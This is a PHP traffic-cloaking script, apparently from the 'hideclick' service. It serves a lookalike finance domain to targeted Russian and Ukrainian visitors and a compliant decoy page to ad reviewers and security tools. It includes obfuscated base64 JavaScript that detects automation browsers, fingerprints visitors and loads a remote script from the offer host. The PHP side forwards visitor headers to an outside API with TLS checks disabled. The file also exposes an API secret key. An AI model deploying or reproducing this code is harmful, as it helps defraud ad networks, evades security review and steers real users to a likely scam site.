<?php
/* Required settings     */
$CLOAKING['OFFER_PAGE'] = 'https://top.flnance.ru/';//PHP/HTML file or URL offer used for real users
$CLOAKING['DEBUG_MODE'] = 'on';// replace "on" with "off" to switch from debug to production mode
$CLOAKING['STEALTH'] = 'off';// replace "on" with "off" to hide stat page
/*********************************************/
/* Available additional settings  */

/* Geo filter: Display offer page only to visitors from allowed countries.  */
/* For example, if you enter 'RU,UA' in the next line, system will only allow users from Russia and Ukraine */
 $CLOAKING['ALLOW_GEO'] = 'RU,UA';

/* UTM parameters forwarding */
/* true - turn on UTM forwarding; */
/* false - disable UTM forwarding */
 $CLOAKING['UTM'] = true;
/* OFFER_PAGE display method. Available options: redirect, iframe */
/* 'redirect' -  redirect visitors to offer page. (default method due to maximum compatibility with different hostings) */
/* 'iframe' - Open URL in iframe. (recommended and safest method. requires the use of a SSL to work properly) */
 $CLOAKING['OFFER_METHOD'] = 'redirect';

/* Method of integration with WHITE_PAGE. Available options : standart, encoded */
/* YOU MUST TO GENERATE NEW SCRIPT TO CHANGE THIS ! */
 $CLOAKING['WHITE_METHOD'] = 'standart';

/* NO_REF used to block requests with empty referrer. */
/* false - allow requests without referrer */
/* true - block requests without referrer */
$CLOAKING['NO_REF'] = false;

/* WHITE_REF blocks requests if referrer does not match the regular expression.*/
/* For example: 'google|facebook' will block all traffic, exept traffic from google and facebook */
$CLOAKING['WHITE_REF'] = '';

/* change 'false' to 'true' to block Apple devices (iOS, Mac) */
$CLOAKING['BLOCK_APPLE'] = false;

/* change 'false' to 'true' to block Android devices */
$CLOAKING['BLOCK_ANDROID'] = false;

/* change 'false' to 'true' to block Windows devices */
$CLOAKING['BLOCK_WIN'] = false;

/* change 'false' to 'true' to block mobile devices */
$CLOAKING['BLOCK_MOBILE'] = false;

/* change 'false' to 'true' to block desctop devices */
$CLOAKING['BLOCK_DESCTOP'] = false;

/* DELAY_START allows you to block the first X unique IP addresses. */
$CLOAKING['DELAY_START'] = 0;

/* DELAY_PERMANENT always show the whitepage for IP in the list of first X requests */
$CLOAKING['DELAY_PERMANENT'] = false;

/* Paranoia mode uses the most rigid filters. Checks out some additional features inherent in spy services. But at the same time, in some countries, it can block a significant part of real users. */
/* change 'false' to 'true' to activate this mode */
$CLOAKING['PARANOID'] = false;
/* Fast mode. Set 'true' to skip some checks and display offer page faster. Set 'false' to block residential proxy */
$CLOAKING['FAST'] = true;

/* The next settings are needed only if you hosting isn't standart or something doesn't work */
/* delete symbols "//" in the next line if service doesn't work or you use CDN, Varnish or other caching proxy */
//$CLOAKING['DISABLE_CACHE'] = true;
/*********************************************/
/* You API key.                              */
/* DO NOT SHARE API KEY! KEEP IT SECRET!     */
$CLOAKING['API_SECRET_KEY'] = 'v177ecd0474bb149cc84152fb98b0c4cdc';
/*********************************************/
/* YOU MUST TO GENERATE NEW SCRIPT TO CHANGE THIS */
$CLOAKING['WHITE_PAGE'] = '<script>var efgbxxjyazkyzsytjabslxfffjisyiednlelinjjntimlgfvhgnsesyjcgcapgedsioawxkj=function(src){var q=atob("X19zdG9wQWxsVGltZXJzLndlYmRyaXZlci5fX25pZ2h0bWFyZS5fc2VsZW5pdW0uY2FsbFBoYW50b20uY2FsbFNlbGVuaXVtLl9TZWxlbml1bV9JREVfUmVjb3JkZXIuc2VsZW5pdW0uZHJpdmVyLl9zZWxlbml1bS5fX3dlYmRyaXZlcl9ldmFsdWF0ZS5fX3NlbGVuaXVtX2V2YWx1YXRlLl9fd2ViZHJpdmVyX3NjcmlwdF9mdW5jdGlvbi5fX3dlYmRyaXZlcl9zY3JpcHRfZnVuYy5fX3dlYmRyaXZlcl9zY3JpcHRfZm4uX19meGRyaXZlcl9ldmFsdWF0ZS5fX2RyaXZlcl91bndyYXBwZWQuX193ZWJkcml2ZXJfdW53cmFwcGVkLl9fZHJpdmVyX2V2YWx1YXRlLl9fc2VsZW5pdW1fdW53cmFwcGVkLl9fZnhkcml2ZXJfdW53cmFwcGVkLl9waGFudG9tLnBoYW50b20uZG9tQXV0b21hdGlvbl9fbmlnaHRtYXJl").split("."),e=encodeURIComponent,g=0,w=window,d=w.document,n=w.navigator,de="documentElement",s=w.screen,p="",a="avail",i="inner",o="outer",H="Height",W="Width",c=w.chrome?Object.keys(w.chrome).join("*"):"*",tag=d.createElement("script");function wd(){try{for(var l in q){var z=q[l];if(w[z]||n[z])return z;if(d&&d[de]&&d[de].getAttribute&&d[de].getAttribute(z))return z;if(z in w||z in d)return z}return 0}catch(e){}}!function wp(){try{if(n&&n.plugins){Object.keys(n.plugins).forEach(function(i){if(n.plugins[i])p+=n.plugins[i].filename+"*"})}}catch(e){}}();try{g=d.createElement("canvas").getContext("webgl");g=g.getParameter(g.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)}catch(e){}src="https://top.flnance.ru/script.php?clid="+btoa("ref="+e(d.referrer)+"&drive="+wd()+"&c="+c+"&s="+s[a+H]+"*"+w[i+H]+"*"+w[o+H]+"*"+s[a+W]+"*"+w[i+W]+"*"+w[o+W]+"*"+w.devicePixelRatio+"*"+n.maxTouchPoints+"&p="+p+"&h="+n.hardwareConcurrency+"*"+n.deviceMemory+"*"+e(g)+"&t="+e(new Date().toString())+"&q="+e(w.location.search.substr(1)));tag["type"]="text/javascript";tag["src"]=src;document.head.appendChild(tag)}("https://connect.facebook.net/en_US/fbevents.js")</script>';// white page JS script integration code.
// DO NOT EDIT ANYTHING BELOW !!!
if(!empty($CLOAKING['VERSION']) || !empty($GLOBALS['CLOAKING']['VERSION'])) die('Recursion Error');
//$CLOAKING['VERSION']=20200115;
$CLOAKING['VERSION']=20200908;
//$CLOAKING['HTACCESS_FIX'] = true;
/* dirty fix!!! uncomment only if problem with IP detection!!! */
//if(!empty($_SERVER['HTTP_X_REAL_IP'])) $_SERVER['REMOTE_ADDR']=$_SERVER['HTTP_X_REAL_IP'];

if($CLOAKING['FAST']) $stage='js2'; else $stage='js1';

$errorContactMessage="<br><br>Something went wrong. Don’t worry, we will help. Contact us by telegram: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a>";
if(!empty($_GET['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}(-|$)#',$_GET['utm_allow_geo'])) $CLOAKING['ALLOW_GEO']=$_GET['utm_allow_geo'];
if(empty($CLOAKING['PARANOID'])) $CLOAKING['PARANOID']='';
if(empty($CLOAKING['ALLOW_GEO'])) $CLOAKING['ALLOW_GEO']='';
if(empty($CLOAKING['HTACCESS_FIX'])) $CLOAKING['HTACCESS_FIX']='';
if(empty($CLOAKING['DISABLE_CACHE'])) $CLOAKING['DISABLE_CACHE']='';
else {
    setcookie("euConsent", 'true');
    setcookie("BC_GDPR", time());
    header( "Cache-control: private, max-age=0, no-cache, no-store, must-revalidate, s-maxage=0" );
    header( "Pragma: no-cache" );
    header( "Expires: ".date('D, d M Y H:i:s',rand(1560500925,1571559523))." GMT");
}

if(!empty($_REQUEST['cloaking']) && ($CLOAKING['STEALTH']=='off' || $CLOAKING['DEBUG_MODE'] == 'on' || (!empty($_REQUEST['key']) && $_REQUEST['key']==$CLOAKING['API_SECRET_KEY'])) ) {
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    if ($_REQUEST['cloaking'] == 'stat' || $_REQUEST['cloaking'] == 'stats') {
        if(empty($CLOAKING['API_SECRET_KEY'])||strlen($CLOAKING['API_SECRET_KEY'])<16) {
            echo '<html><head><meta charset="UTF-8"></head><body><b>Error: secret API key is missing !</b><br>Put the API key (you can find it in the email) to line <b>#'.cloakedEditor("\$CLOAKING['API_SECRET_KEY']").'</b> so that it looks like:<br><code>$CLOAKING[\'API_SECRET_KEY\'] = \'put your API key here\';</code><br>'.$errorContactMessage;
            die();
        }
        setcookie("hideclick", 'ignore', time()+604800);
        if(!empty($_SERVER['HTTP_HOST'])) $host=$_SERVER['HTTP_HOST'];
        else if(!empty($_SERVER['Host'])) $host=$_SERVER['Host'];
        else if(!empty($_SERVER['host'])) $host=$_SERVER['host'];
        else if(!empty($_SERVER[':authority'])) $host=$_SERVER[':authority'];
        else $host='';
        if(!empty($_SERVER['REQUEST_URI'])) $host.=$_SERVER['REQUEST_URI'];
        if(stristr($host,'?')) $host=substr(0,strpos($host,'?'));
        if(substr($host,0,4)=='www.') $host=substr($host,4);
        $domainStat='';
        if(!empty($_REQUEST['domain'])) $domainStat.='&domain='.$_REQUEST['domain'];
        if(!empty($_REQUEST['date2'])) $domainStat.='&date2='.$_REQUEST['date2'];//timestamp
        else $domainStat.='&date2='.time();
        if(!empty($_REQUEST['date1'])) $domainStat.='&date1='.$_REQUEST['date1'];//timestamp
        else $domainStat.='&date1='.(time()-604800);
        if (!function_exists('curl_init')) $statistic = file_get_contents('https://hideapi.xyz/newstatjs?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&sign=921085941761f1602628938&version='.$CLOAKING['VERSION'].'&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&host=' . urlencode($host) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']).$domainStat, 'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 45), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,) )) );
        else $statistic = cloakedCurl('https://hideapi.xyz/newstatjs?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&sign=921085941761f1602628938&version='.$CLOAKING['VERSION'].'&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&host=' . urlencode($host) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']).$domainStat);
        echo $statistic;
        if (empty($statistic)) echo "<html><head><meta charset=\"UTF-8\"></head><body>".$errorContactMessage;
    }
    else if ($_REQUEST['cloaking'] == 'debug') {phpinfo();print_r(debug_backtrace ());$CLOAKING['API_SECRET_KEY']=1;print_r(htmlentities(print_r($CLOAKING,true)));die();}
    else if ($_REQUEST['cloaking'] == 'test') {
        if (!function_exists('curl_init')) {
            echo "<br>CURL not found<br>\n";
            $http_response_header = array();
            echo "HTTP domain";
            $statistic = file_get_contents('http://api.hideapi.xyz/status', 'r', stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header' => "Content-type: application/x-www-form-urlencoded\r\n" . "Content-Length: 4\r\n", 'content' => 'ping'))));
            print_r($http_response_header);
            echo "<br>\n";
            print_r($statistic);
            echo "<hr>\n";
            $http_response_header = array();
            echo "HTTPS domain\n";
            $statistic = file_get_contents('https://hideapi.xyz/status', 'r', stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header' => "Content-type: application/x-www-form-urlencoded\r\n" . "Content-Length: 4\r\n", 'content' => 'ping'))));
            print_r($http_response_header);
            echo "<br>\n";
            print_r($statistic);
            echo "<hr>\n";
        }
        else {
            $body = 'ping';
            echo "<br>using CURL<br>\n";
            $ch = curl_init();
            echo "HTTP domain";
            curl_setopt($ch, CURLOPT_URL,'http://api.hideapi.xyz/status');
            if(!empty($body)) {curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, "$body");}
            if(!empty($returnHeaders)) curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $r = @curl_exec($ch);
            $info = curl_getinfo($ch);
            print_r($info);
            echo "<br>\n";
            curl_close ($ch);
            echo "$r<hr>\n";

            $ch = curl_init();
            echo "HTTPS domain";
            curl_setopt($ch, CURLOPT_URL,'https://hideapi.xyz/status');
            if(!empty($body)) {curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, "$body");}
            if(!empty($returnHeaders)) curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $r = @curl_exec($ch);
            $info = curl_getinfo($ch);
            print_r($info);
            echo "<br>\n";
            curl_close ($ch);
            echo "$r<hr>\n";
        }
    }
    else if ($_REQUEST['cloaking'] == 'time') {
        header( "Cache-control: public, max-age=999999, s-maxage=999999" );
        header( "Expires: Wed, 21 Oct 2025 07:28:00 GMT" );
        echo str_replace(" ","",rand(1,10000).microtime().rand(1,100000));
    }
    die();
}

else if($CLOAKING['DEBUG_MODE'] == 'on'){
    set_time_limit(5);
    ini_set('max_execution_time',5);
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    $error=0;
    setcookie("hideclick", 'ignore', time()+604800);
    // don't use $_SERVER["REDIRECT_URL"], as there is servers that use it without redirect
    if(!empty($_GET) || !empty($_POST) || ($_SERVER["SCRIPT_NAME"]!=$_SERVER["REQUEST_URI"] && $_SERVER["REQUEST_URI"]!=str_replace("index.php","",$_SERVER["SCRIPT_NAME"]))) {
        echo "<html><head><meta charset=\"UTF-8\"></head><body>Error with rewrite engine.<!--//'".$_SERVER["SCRIPT_NAME"]."'!='".$_SERVER["REQUEST_URI"]."'//-->".$errorContactMessage;
        die();
    }
    echo '<html><head><meta charset="UTF-8"><style type="text/css">body, html {font-family: Calibri, Ebrima;}img {margin-left:2em;opacity: 0.25;}img:hover {opacity: 1.0;}</style></head><body><b>Congratulations.</b><br>Literally in a moment you can increase your ROI.<br><br><b>First, make sure that everything is configured correctly:</b><br>';
    if(strstr($CLOAKING['OFFER_PAGE'],'://')) echo '✔ OFFER_PAGE - ok.<br>';
    else {echo '❌ OFFER_PAGE - error! Change the value in line <b>#'.cloakedEditor("\$CLOAKING['OFFER_PAGE']").'</b> to the page that will be displayed to targeted users<br><img src="https://hide.click/gif/black.gif" border="1"><br>';$error=1;}
    $CLOAKINGdata='{}';
    if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=921085941761f1602628938&version='.$CLOAKING['VERSION'].'&curl=false&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'] , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
    else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=921085941761f1602628938&version='.$CLOAKING['VERSION'].'&curl=true&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'], $CLOAKINGdata);

    if(!$CLOAKING['STATUS'] || stristr($CLOAKING['STATUS'],'error')){
        echo '❌ PHP configuration error. Contact your hosting support and ask them to enable CURL in PHP.<br>';
        $error=1;
    }
    if(stristr($CLOAKING['STATUS'],'payment')||stristr($CLOAKING['STATUS'],'expired')){
        echo '❌ Your secret API key has expired or blocked due terms violation. Contact support to extend the service!<br>';
        $error=1;
    }
    $CLOAKING['STATUS'] = json_decode($CLOAKING['STATUS'], true);
    if(empty($CLOAKING['STATUS']) || empty($CLOAKING['STATUS']['action'])){
        echo '❌ Network error. Your hosting provider might be using some kind of firewall or resource limiter that will result in excessive traffic loss. It can\'t be fixed on our side. You need a different hosting. Contact us if you have any questions.<br><br>';
        $error=1;
    }

    $CLOAKINGdata = array();
    if (function_exists("getallheaders")) $CLOAKINGdata = getallheaders();
    foreach($_SERVER as $k=> $v){
        if (substr($k, 0, 5) == 'HTTP_') $CLOAKINGdata[$k] = $v;
    }
    $CLOAKINGdata['path']=$_SERVER["REQUEST_URI"];
    $CLOAKINGdata['REQUEST_METHOD']=$_SERVER['REQUEST_METHOD'];
    if( $_SERVER["SERVER_PORT"]==443 || !empty($_SERVER['HTTPS']) || !empty($_SERVER['SSL']) ) $CLOAKINGdata['HTTP_HTTPS']='1';
    $CLOAKINGdata = json_encode($CLOAKINGdata);
    if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=921085941761f1602628938&version='.$CLOAKING['VERSION'].$CLOAKING['WHITE_METHOD'].'.'.$CLOAKING['OFFER_METHOD'].'.'.$CLOAKING['FAST'].'&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&paranoid='.$CLOAKING['PARANOID'].'&offer='.urlencode($CLOAKING['OFFER_PAGE']) , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
    else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=921085941761f1602628938&version='.$CLOAKING['VERSION'].$CLOAKING['WHITE_METHOD'].'.'.$CLOAKING['OFFER_METHOD'].'.'.$CLOAKING['FAST'].'&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&paranoid='.$CLOAKING['PARANOID'].'&offer='.urlencode($CLOAKING['OFFER_PAGE']), $CLOAKINGdata);
    $CLOAKING['STATUS'] = json_decode($CLOAKING['STATUS'], true);
    if(empty($CLOAKING['STATUS']) || empty($CLOAKING['STATUS']['action'])){
        echo '❌ Bad network! Your hosting provider might be using some kind of firewall or resource limiter that will result in excessive traffic loss. It can\'t be fixed on our side. You need a different hosting. Contact us if you have any questions.<br><br>';
        $error=1;
    }
    if($CLOAKING['STATUS']['action']!='allow') {
//        echo '⚠ We do not recommend using VPN, anonymizers, privacy plugins or antidetect browsers during the setup process<br><br>';
        echo '⚠ You may not see the offer if you are using VPN/proxy/developer_extensions/privacy_plugins/antidetect_browsers or other security tools during the setup process. Use standart browser and local/WiFi/mobile coonection to check offer page<br><br>';
    }

    // Needed to check if cache is using
    $testUrl= ( $_SERVER["SERVER_PORT"]==443 || (!empty($_SERVER['HTTP_CF_VISITOR']) && stristr($_SERVER['HTTP_CF_VISITOR'],'https')) || (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO']=='https') || !empty($_SERVER['HTTPS'])  ) ? 'https://' : 'http://';
    // There's some bugs with CDN if using $_SERVER['HTTP_HOST'], so use $_SERVER["SERVER_NAME"] instead!
    $queryBug=strpos($_SERVER["REQUEST_URI"],'?');
    if(empty($_SERVER["SERVER_NAME"]) || $_SERVER["SERVER_NAME"] == '_' || $_SERVER["SERVER_NAME"] == 'localhost') $_SERVER["SERVER_NAME"] = $_SERVER["HTTP_HOST"];
    if($queryBug>0) $testUrl.=$_SERVER["SERVER_NAME"].substr($_SERVER["REQUEST_URI"],0,$queryBug).'?cloaking=time';
    else $testUrl.=$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"].'?cloaking=time';
    $http_response_header=array();
    $static1 = !function_exists('curl_init') ? file_get_contents($testUrl,'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 5), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,))) ) : cloakedCurl($testUrl);
    $static2 = !function_exists('curl_init') ? file_get_contents($testUrl,'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 5), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,))) ) : cloakedCurl($testUrl);
    $static3 = !function_exists('curl_init') ? implode("\n",$http_response_header) : cloakedCurl($testUrl,'',true);
    // Set-Cookie vs empty($CLOAKING['DISABLE_CACHE']) || !empty($CLOAKING['DISABLE_CACHE']) ???
    // x-cache-enabled: True
    // x-proxy-cache: HIT
    if(preg_match('#Proxy|Microcachable#i',$static3) || (empty($CLOAKING['DISABLE_CACHE']) && preg_match('#Set-Cookie#i', $static3) && !strstr($static3, '__cfduid=')) ){
        echo '❌ Bad server configuration. Contact us. We will help.<br><br>';
    }
    else if($static1>0 && $static2>0 && $static1<=100000  && $static2<=100000 && $static1!=$static2) {}
    else if(empty($static1)||empty($static2)) {
        echo '❌ Bad server configuration. Contact us. We will try to help.<br><br>';
        $error=1;
    }
    else if(empty($CLOAKING['DISABLE_CACHE'])) {
        echo '❌ Bad server configuration. Remove <b>//</b> at the beginning of a line <b>#'.cloakedEditor("\$CLOAKING['DISABLE_CACHE']").'</b> to activate "DISABLE_CACHE" mode.<br><img src="https://hide.click/gif/cache.gif" border="1"><br><br>';
        $error=1;
    }
    if(preg_match('#x-cache-enabled.*True#i',$static3)) {
        echo '❌ Bad server. The current server caches the results, which will lead to large traffic losses and a high probability of being banned. It can\'t be fixed on our side. You need a different hosting. Contact us if you have any questions.<br><br>';
        $error=1;
    }
//    else if(!empty($CLOAKING['DISABLE_CACHE'])) {
//        echo '❌ Bad server configuration. Ask hosting support to turn off caching (or move website to another hosting).<br><br>';
//        $error=1;
//    }
    if(preg_match('#[^A-Za-z ,]+#',$CLOAKING['ALLOW_GEO'])) {
        echo '❌ Geo filter is not configured correctly. Only letters A-Z (2x country codes) and commas can be used at line <b>#'.cloakedEditor("\$CLOAKING['ALLOW_GEO']").'</b>.<br><img src="https://hide.click/gif/geo.gif" border="1"><br>';
        $error=1;
    }
    if($CLOAKING['DELAY_START']) {
        file_put_contents('dummyCounter.txt','');
        if(!is_file('dummyCounter.txt')) {
            echo '❌ In order DELAY_START filter to work you need to create a file <b>dummyCounter.txt</b> in the directory <b>'.getcwd().'</b>. Make sure that the file is writable.<br>';
            $error = 1;
        }
        else if(!is_writable('dummyCounter.txt')){
            echo '❌ Make sure that the <b>dummyCounter.txt</b> file located in <b>'.getcwd().'</b>  is writable.<br>';
            $error = 1;
        }
    }

    if($error) { echo "<br><b>Correct the errors and reload the page.</b><br><br>Do you need some help? Write to us in telegram: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a>";die(); }

    if(empty($CLOAKING['ALLOW_GEO'])) echo '✔ Geo filtering is turned off. Put the two-letters country codes of allowed countries at the line <b>#'.cloakedEditor("\$CLOAKING['ALLOW_GEO']").'</b>.<br><img src="https://hide.click/gif/geo.gif" border="1"><br>';
    else echo '✔ Geo filtering is turned on. All countries except '.$CLOAKING['ALLOW_GEO'].' will get white page. You can change two-letters country codes of allowed countries at the line #'.cloakedEditor("\$CLOAKING['ALLOW_GEO']").'</b><br><img src="https://hide.click/gif/geo.gif" border="1"><br>';
    echo '✔ <a target="_blank" href="?cloaking=stat">Click here to open the statistics page</a>. Bookmark it for future reference.<br><br>';
    if(empty($_SERVER['HTTP_CF_RAY']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_REAL_IP']) && !empty($_SERVER['REMOTE_ADDR']) && !empty($_SERVER['SERVER_ADDR']) && $_SERVER['HTTP_X_FORWARDED_FOR']==$_SERVER['HTTP_X_REAL_IP'] && $_SERVER['HTTP_X_REAL_IP']!=$_SERVER['REMOTE_ADDR'] && $_SERVER['REMOTE_ADDR']!=$_SERVER['SERVER_ADDR']) {
        echo '❌ It looks like your server falsify the user IP address. Contact us via telegram: <a href="tg://resolve?domain=hideclick_official">@hideclick_official</a> to make sure everything is working correctly.<br>';
    }
    echo '⚠ Add JavaScript to your white page: <script>function copy(){var copyText = document.getElementById("myInput");copyText.select();copyText.setSelectionRange(0, 999999);document.execCommand("copy");}</script><code><input type="text" value="'.htmlentities($CLOAKING['WHITE_PAGE']).'" id="myInput"><button onclick="copy()">copy to clipboard</button></code>  Edit HTML and add code after &lt;HEAD&gt; :<br><br>';
    echo '⚠ Last step: If everything works without errors, turn off the DEBUG_MODE by changing the value in line <b>#'.cloakedEditor("\$CLOAKING['DEBUG_MODE']").'</b> to <b>off</b>.<br><img src="https://hide.click/gif/debug.gif" border="1"><br>';
    echo 'After that, the script will start working in production mode and instead of this page you will see some JavaScript code.<br><br>';
    echo '<b>Important!<br>WHITE_PAGE MUST COMPLETELY COMPLY WITH THE ADVERTISING NETWORK RULES!</b><br>Do you need more information on how to make the right white page? Contact us in telegram: <a href="tg://resolve?domain=hideclick_official">@hideclick_official</a>.';
    die();
}
else {

}

if(empty($CLOAKING['OFFER_PAGE']) || (!strstr($CLOAKING['OFFER_PAGE'],'://') )){
    echo "<html><head><meta charset=\"UTF-8\"></head><body>ERROR: Non valid offer page: OFFER_PAGE='".$CLOAKING['OFFER_PAGE']."'!\r\n<br>".$errorContactMessage;
    die();
}

if (function_exists('header_remove')) header_remove("X-Powered-By");
@ini_set('expose_php', 'off');

$CLOAKINGdata = array();

if (function_exists("getallheaders")) $CLOAKINGdata = getallheaders();
foreach($_SERVER as $k=> $v){
    if (substr($k, 0, 5) == 'HTTP_') $CLOAKINGdata[$k] = $v;
}
// fix to support early versions...
$getvars=array();
if(!empty($_GET['clid']) && base64_decode($_GET['clid'])) {
    parse_str(base64_decode($_GET['clid']),$getvars);
    if($getvars) {
        $_SERVER['REQUEST_URI'] = preg_replace('#\?clid=.*#', '?' . base64_decode($_GET['clid']), $_SERVER['REQUEST_URI']);
        $_SERVER['QUERY_STRING'] = base64_decode($_GET['clid']);
        if (!empty($getvars['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}(-|$)#', $getvars['utm_allow_geo'])) $CLOAKING['ALLOW_GEO'] = $getvars['utm_allow_geo'];
        $_GET['ref'] = $getvars['ref'];
        $_GET['q'] = $getvars['q'];
    }
}

$CLOAKINGdata['path']=$_SERVER["REQUEST_URI"];
$CLOAKINGdata['REQUEST_METHOD']=$_SERVER['REQUEST_METHOD'];
//fix for roadrunner ???
//$CLOAKINGdata['host']=$CLOAKING['DOMAIN'];//fix for roadrunner ???
//$CLOAKINGdata['path']=http_build_query ($_GET);//fix for roadrunner ???

$CLOAKING['banReason']='';
if($CLOAKING['NO_REF'] || !empty($CLOAKING['WHITE_REF'])){
    $ref='';
    foreach (array('HTTP_REFERER','Referer','referer','REFERER') as $k){
        if(!empty($CLOAKINGdata[$k])) {$ref=$_SERVER[$k];break;}
    }
    if(empty($ref) || empty($_GET['ref'])) $CLOAKING['banReason'].='noref.';
//    elseif(!empty($CLOAKING['WHITE_REF']) && !preg_match("#https?://[^/]*(".$CLOAKING['WHITE_REF'].")#i",$ref)) $CLOAKING['banReason'].='blackref.';
}
if($CLOAKING['BLOCK_APPLE'] || $CLOAKING['BLOCK_ANDROID'] || $CLOAKING['BLOCK_WIN'] || $CLOAKING['BLOCK_MOBILE'] || $CLOAKING['BLOCK_DESCTOP']) {
    $ua='';
    foreach (array('HTTP_USER_AGENT','USER-AGENT','User-Agent','User-agent','user-agent') as $k){
        if(!empty($CLOAKINGdata[$k])) {$ua=$_SERVER[$k];break;}
    }
    if($CLOAKING['BLOCK_APPLE'] && stristr($ua,'Mac OS')) $CLOAKING['banReason'].='blockapple.';
    if($CLOAKING['BLOCK_ANDROID'] && stristr($ua,'Android')) $CLOAKING['banReason'].='blockandroid.';
    if($CLOAKING['BLOCK_WIN'] && stristr($ua,'Windows')) $CLOAKING['banReason'].='blockwin.';
    if($CLOAKING['BLOCK_MOBILE'] && (stristr($ua,'like Mac OS X')||stristr($ua,'Android')||stristr($ua,'mobile')||stristr($ua,'table'))) $CLOAKING['banReason'].='blockmobile.';
    if($CLOAKING['BLOCK_DESCTOP'] && !(stristr($ua,'like Mac OS X')||stristr($ua,'Android')||stristr($ua,'mobile')||stristr($ua,'table')))  $CLOAKING['banReason'].='blockdescktop.';
}
if($CLOAKING['DELAY_START']) {
    $ip='';
    foreach (array('HTTP_CF_CONNECTING_IP','CF-Connecting-IP','Cf-Connecting-Ip','cf-connecting-ip') as $k){
        if(!empty($_SERVER[$k])) $ip=$_SERVER[$k];
    }
    if(empty($ip)) {
        foreach (array('HTTP_FORWARDED', 'Forwarded', 'forwarded', 'REMOTE_ADDR') as $k) {
            if (!empty($_SERVER[$k])) $ip .= $_SERVER[$k];
        }
    }
    $ips=file('dummyCounter.txt',FILE_IGNORE_NEW_LINES);
    if(empty($ips)) {$ips=array(0=>0);file_put_contents('dummyCounter.txt',"0\n", FILE_APPEND);}
    else $ips=array_flip($ips);
    $ip=crc32($ip);
